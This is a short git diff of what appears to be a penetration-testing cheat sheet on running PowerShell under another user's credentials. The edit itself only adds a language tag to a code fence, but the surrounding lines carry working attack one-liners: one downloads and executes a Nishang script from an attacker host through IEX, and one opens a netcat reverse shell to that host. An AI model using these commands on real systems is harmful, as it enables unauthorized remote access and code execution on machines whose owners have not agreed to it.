@@ -10,7 +10,7 @@ $cred = New-Object System.Management.Automation.PSCredential ("<USERNAME>", (Con
 Start-Process -Credential $Cred PowerShell.exe -ArgumentList IEX(New-Object Net.webClient).downloadString('http://<KALI_IP>/nishang.ps1')
 ```
 ### Method #3: Invoke-Command --> Has Fork Effect
-```
+```powershell
 $cred = New-Object System.Management.Automation.PSCredential ("<USERNAME>", (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force))
 Invoke-Command 127.0.0.1 -Credential $Cred -Scriptblock {c:\programdata\nc64.exe -e powershell.exe <KALI_IP> <PORT>} -AsJob
 ```
